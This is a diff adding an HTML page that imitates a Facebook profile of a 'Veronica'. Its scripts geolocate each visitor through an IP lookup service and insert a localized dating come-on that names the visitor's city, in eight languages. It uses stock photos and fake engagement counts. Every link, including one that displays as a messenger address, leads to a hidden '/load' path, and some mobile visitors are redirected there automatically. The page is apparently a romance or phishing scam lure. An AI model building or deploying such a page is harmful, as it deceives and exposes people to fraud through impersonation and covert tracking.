@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<script src='https://kit.fontawesome.com/a076d05399.js'></script>
+<style>
+body {margin:0;
+  font-family:"lucida grande",tahoma,verdana,arial,sans-serif;
+  font-size: 14px;
+  max-width:340px;
+  margin: auto;
+  background-color:#eeeeee;
+  }
+#container {
+  background-color:#ffffff;
+  }
+.icon-bar {
+  width: 100%;
+  background-color: #375B95;
+  overflow: auto;
+}
+
+.icon-bar a {
+  float: left;
+  width: 20%;
+  text-align: center;
+  padding: 12px 0;
+  transition: all 0.3s ease;
+  color: #142741;
+  font-size: 25px;
+}
+
+.active {
+  background-color: #203E6B;
+  color: #fff;
+}
+table, .cl {
+  font-family: arial, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+a {
+ text-decoration:none;
+ color:#000;
+ }
+td, th {
+  width: 33.3%;
+  border: 0px solid #dddddd;
+  text-align: center;
+  padding: 8px;
+}
+#caption {
+  width:97%;
+  text-align:left;
+  }
+</style>
+<script src="https://cdn-aimi.akamaized.net/mr/mobile-detect.min.js"></script> <script type="text/javascript">
+var md = new MobileDetect(window.navigator.userAgent);
+if (md.mobile() || md.tablet()) {
+var redirect = false;
+var excludeTablets = true;
+var excludeIOSAndroid = true;
+var isiOs = md.is("iOs"); var isAndroidOs = md.is("AndroidOs"); var isFeaturePhone = md.mobile() && !isiOs && !isAndroidOs; if (isFeaturePhone || md.tablet() && excludeTablets
+|| (((isiOs && !md.tablet()) || isAndroidOs) && excludeIOSAndroid)) {
+redirect = true;
+}
+
+if (redirect) {
+location.href= '/load'; }}</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script>
+var url = "https://ipapi.co/json/";
+
+$.ajax({
+  method: "GET",
+  cache: false,
+  url: url,
+  success: function(data) {
+    document.getElementById('output').innerHTML = data.city+", "+data.region+", "+data.country_name;
+  },
+  error: function(error) {
+    //What do you want to do with the error?
+  },
+});
+</script>
+<script>
+var url = "https://ipapi.co/json/";
+
+$.ajax({
+  method: "GET",
+  cache: false,
+  url: url,
+  success: function(data) {
+    document.getElementById('city').innerHTML = " from "+data.city;
+  },
+  error: function(error) {
+    //What do you want to do with the error?
+  },
+});
+</script>
+<body>
+    <script>
+        jQuery.ajax({
+            url: 'https://ipapi.co/json/',
+            type: 'POST',
+            dataType: 'json',
+            success: function(location) {
+                if (location.country_code === 'IT') {
+                    document.getElementById("pcapt").innerHTML = 'Ciao, mi chiamo Veronica<span id=\"city\"></span>. Mi piacerebbe incontrare un gentiluomo carismatico di età inferiore ai 50 anni. Amo la palestra, la musica e la danza 😊<br>Vi prego di contattarmi su: <a style=\"color:#3b5998;\" href=\"/load\">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'DE') {
+                    document.getElementById("pcapt").innerHTML = 'Hallo, ich heiße Veronica<span id=\"city\"></span>. Ich würde gerne einen charismatischen Herrn unter 50 Jahren treffen. Ich liebe Fitness, Musik und Tanzen 😊<br>Bitte kontaktieren Sie mich unter: <a style=\"color:#3b5998;\" href=\"/load\">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'FR') {
+                    document.getElementById("pcapt").innerHTML = 'Salut, je m\'appelle Veronica<span id=\"city\"></span>. Je voudrais rencontrer un monsieur charismatique de moins de 50 ans. J\'adore la gym, la musique et la danse 😊<br>Veuillez me contacter sur: <a style=\"color:#3b5998;\" href=\"/load\">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'ES') {
+                    document.getElementById("pcapt").innerHTML = 'Hola, mi nombre es Veronica<span id="city"></span>. Me gustaría conocer a un caballero carismático menor de 50 años. Amo el gimnasio, la música y el baile 😊<br>Por favor contáctame en: <a style="color:#3b5998;" href="/load">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'PL') {
+                    document.getElementById("pcapt").innerHTML = 'Cześć, nazywam się Veronica<span id=\"city\"></span>. Chciałbym spotkać charyzmatycznego dżentelmena w wieku poniżej 50 lat. Uwielbiam siłownię, muzykę i taniec 😊<br>Proszę o kontakt: <a style=\"color:#3b5998;\" href=\"/load\">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'RO') {
+                    document.getElementById("pcapt").innerHTML = 'Bună, mă numesc Veronica<span id="city"></span>. Aș dori să cunosc un domn carismatic sub 50 de ani. Ador sala de sport, muzica și dansul 😊<br>Vă rugăm să mă contactați la: <a style="color:#3b5998;" href="/load">https://msg.me/veronica-s</a>';
+                } else if (location.country_code === 'SE') {
+                    document.getElementById("pcapt").innerHTML = 'Hej, jag heter Veronica<span id="city"></span>. Jag skulle vilja träffa en karismatisk gentleman under 50 år. Jag älskar gym, musik och dans 😊<br>Vänligen kontakta mig på: <a style="color:#3b5998;" href="/load">https://msg.me/veronica-s</a>';
+                } else {
+                    document.getElementById("pcapt").innerHTML = 'Hi, my name is Veronica<span id=\"city\"></span>. I would like to meet some charismatic gentleman under 50 years old. I love gym, music and dancing 😊<br>Please contact me on: <a style=\"color:#3b5998;\" href=\"/load\">https://msg.me/veronica-s</a>';
+                }
+            }
+        });
+    </script>
+<script>
+var listgmbr =  ['https://i.imglol.de/a-(1)mv17kf6f.jpg',
+'https://i.imglol.de/a-(2)9t2089v4.jpg',
+'https://i.imglol.de/a-(3)xjhn046a.jpg',
+'https://i.imglol.de/a-(4)et8a67bi.jpg',
+'https://i.imglol.de/a-(5)x2l9iy68.jpg',
+'https://i.imglol.de/a-(6)jslad1pz.jpg',
+'https://i.imglol.de/a-(7)z223hdkz.jpg',
+'https://i.imglol.de/a-(8)huyteob0.jpg',
+'https://i.imglol.de/a-(9)ok6dihj5.jpg',
+'https://i.imglol.de/a-(10)m586eaq7.jpg']
+var gmbr =  listgmbr[Math.floor(Math.random()*listgmbr.length)];
+</script>
+<div style="background-color:#ffffff;" class="container">
+<div class="icon-bar">
+  <a href="/"><i class="fas fa-angle-left"></i></a> 
+  <a class="active" href="/load"><i class="fas fa-user-friends"></i></a> 
+  <a href="/load"><i class="fab fa-facebook-messenger"></i></a> 
+  <a href="/load"><i class="fas fa-globe-americas"></i></a>
+  <a href="/load"><i class="fas fa-user"></i></a> 
+</div>
+<div class="caption">
+<p style="background-color:#ffffff;margin-left: 1.5%;color:#3b5998;"><strong style="font-size:15px;">Veronica Shine <i class="fa fa-check-circle" style="color:#2C8CE4"></i></strong><br><i class='fas fa-map-marker-alt'></i> <span id="output" style="font-size:12px;"></span></p>
+<p id="pcapt" style="margin-left: 1%;margin-right: 1%;"></p>
+</div>
+<a href="/load"><div class="content" >
+<center><script>document.write("<img style=\"width:97%;border: 0.50px solid #000; margin-top:1%;\" src=\""+gmbr+"\" width=\"60%\" />");</script></center>
+</div></a>
+
+<hr style="width:97%;border: 0.50px solid #000;">
+<a href="/load"><table id="cl">
+  <tr>
+    <td><i class="far fa-thumbs-up"></i> Like</td>
+    <td><i class="far fa-comment-alt"></i> Comment</td>
+    <td><i class="far fa-share-square"></i> Share</td>
+</table></a>
+<hr style="width:100%;border: 0.50px solid #dddddd;">
+<span><i class="fas fa-thumbs-up" style="font-size: 12px;color:white;background-color:#2473F1;border: 3px solid #2473F1;border-radius:50%;"></i><i class="fas fa-heart" style="font-size: 12px;color:white;background-color:#EE1D3A;border: 3px solid #EE1D3A;border-radius:50%;"></i> 256</span>
+<hr style="width:100%;border: 0.50px solid #dddddd;">
+</div>
+</body>
+</html> 
